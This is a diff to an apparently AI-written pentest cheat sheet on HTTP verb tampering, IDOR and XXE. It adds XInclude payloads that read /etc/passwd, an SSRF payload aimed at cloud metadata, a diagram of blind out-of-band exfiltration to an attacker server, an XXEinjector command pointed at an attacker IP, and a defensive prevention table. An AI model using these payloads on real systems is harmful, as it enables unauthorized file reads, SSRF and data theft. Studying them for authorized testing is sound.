@@ -14,10 +14,10 @@ Three core web attack classes: HTTP Verb Tampering, IDOR, and XXE. Use alongside
 
 | Tool | Purpose |
 |---|---|
-| `Burp Suite` | Intercept and replay requests, modify verbs, test IDOR IDs, inject XXE payloads |
-| `curl` | Verb tampering (`-X`), IDOR probing, XXE payload delivery |
-| `ffuf` | IDOR enumeration — fuzz numeric/UUID object references |
-| `XXEinjector` | Automated XXE exploitation — `git clone https://github.com/enjoiz/XXEinjector` |
+| [[Tools/Web/Burpsuite\|Burp Suite]] | Intercept and replay requests, modify verbs, test IDOR IDs, inject XXE payloads |
+| [[Tools/File Transfer/cURL\|curl]] | Verb tampering (`-X`), IDOR probing, XXE payload delivery |
+| [[Tools/Scanning/ffuf\|ffuf]] | IDOR enumeration — fuzz numeric/UUID object references |
+| [[Tools/Payloads & Shells/XXEinjector\|XXEinjector]] | Automated XXE exploitation — file read, directory listing, OOB |
 
 ---
 
@@ -57,9 +57,15 @@ curl -s -X GET "http://<target>/search.php?q=1' OR '1'='1"
 # if ($_SERVER['REQUEST_METHOD'] == 'POST') { sanitize($_POST['input']); }
 # GET request bypasses the sanitization block entirely
 
-# Fuzz verbs with ffuf
-ffuf -w /usr/share/seclists/Fuzzing/http-request-methods.txt -u http://<target>/admin.php -X FUZZ -mc 200,302 -v
+# Fuzz verbs — shell loop, NOT ffuf (see warning)
+while read -r verb; do
+  printf '%-8s %s\n' "$verb" \
+    "$(curl -s -o /dev/null -w '%{http_code} %{size_download}b' -X "$verb" "http://<target>/admin.php")"
+done < /usr/share/seclists/Fuzzing/http-request-methods.txt
 ```
+
+> [!warning]
+> `ffuf -X FUZZ` does **not** fuzz methods. ffuf only substitutes the `FUZZ` keyword in the URL (`-u`), headers (`-H`), and POST data (`-d`) — in the `-X` position it sends a literal method named `FUZZ` on every request. You get responses back and it looks like it worked, but nothing was tested. Use the loop above, or Burp Intruder with the verb as the payload position.
 
 ### Burp Suite
 
@@ -301,9 +307,52 @@ curl -s -X POST "http://<target>/submit" -H "Content-Type: application/xml" -d '
 # File contents appear in error message: "file not found: /NONEXISTENT/<passwd contents>"
 ```
 
+### XInclude — When You Can't Control the DOCTYPE
+
+If the app embeds your input *inside* its own XML document, you never get to declare a `<!DOCTYPE>` — so classic entity XXE is off the table. `XInclude` works from a single element instead.
+
+```bash
+# The app takes a plain parameter and drops it into server-side XML.
+# No DOCTYPE needed — just the xi namespace on the element you control.
+curl -s -X POST "http://<target>/submit" \
+  -d 'name=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
+```
+
+```xml
+<!-- parse="text" is required for non-XML files — without it the parser tries
+     to parse /etc/passwd AS XML and fails -->
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+
+<!-- SSRF variant -->
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
+</foo>
+```
+
+> [!tip]
+> Reach for XInclude whenever the request body isn't XML but you suspect the value lands in XML server-side — SOAP backends, report generators, and XML-based document pipelines all qualify. Requires the parser to have XInclude processing enabled, which is common in Java (`DocumentBuilderFactory.setXIncludeAware(true)`).
+
+---
+
 ### Blind OOB Exfiltration
 
-When nothing is reflected and no errors shown:
+When nothing is reflected and no errors shown. The flow is four hops and easy to get lost in:
+
+```mermaid
+sequenceDiagram
+    autonumber
+    participant A as Attacker
+    participant T as Target XML parser
+    participant S as Attacker HTTP server
+    A->>T: POST XML with external DTD ref
+    T->>S: GET /xxe.dtd
+    S-->>T: DTD defining %file and %oob
+    Note over T: parser reads the local file<br/>and builds the callback URL
+    T->>S: GET /?data=base64(file)
+    S-->>A: logged - decode to recover the file
+```
 
 ```bash
 # xxe.dtd — base64 encode file and exfil via HTTP GET:
@@ -484,6 +533,25 @@ ruby XXEinjector.rb --host=<attacker-ip> --httpport=8000 --file=request.txt --br
 
 ---
 
+## Prevention (Know the Defenses)
+
+| Class | Control | Residual gap |
+|---|---|---|
+| **Verb tampering** | Deny-by-default method allowlist per route | Framework-level config (`<Limit GET POST>` in Apache, `http-method` in `web.xml`) is the classic footgun — it constrains *only* the listed verbs and silently permits the rest |
+| **Verb tampering** | Reject `X-HTTP-Method-Override` at the edge | Middleware often honours it before your auth layer ever runs |
+| **IDOR** | Authorize **the object**, not the route | The single real fix. Session says who you are; the query must confirm you own *this* row |
+| **IDOR** | Unpredictable identifiers (UUIDv4) | Obscurity, not authorization. v1 UUIDs are time-based and brutable; many apps still accept the integer ID alongside the GUID |
+| **IDOR** | Indirect reference maps (per-session handles) | Works, but rarely applied to every endpoint — check bulk/export/report routes |
+| **XXE** | Disable DTDs entirely (`disallow-doctype-decl`) | The complete fix. Anything narrower leaves gaps |
+| **XXE** | Disable external entities only | Blocks classic XXE but **not XInclude**, and not billion-laughs DoS |
+| **XXE** | Disable XInclude (`setXIncludeAware(false)`) | Needed *in addition* — the two settings are independent |
+| **XXE** | Egress filtering | Blocks HTTP OOB, not DNS. And not error-based or reflected file read |
+
+> [!warning]
+> The two XXE settings are independent, which is the most common remediation miss: an app that disabled external entities but left XInclude enabled is still exploitable via the section above. Retest both.
+
+---
+
 ## Quick Reference
 
 ```bash
@@ -510,5 +578,5 @@ curl -s -X POST "http://<target>/endpoint" -H "Content-Type: application/xml" -d
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-07-21*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-18*
+*Model: claude-opus-5*
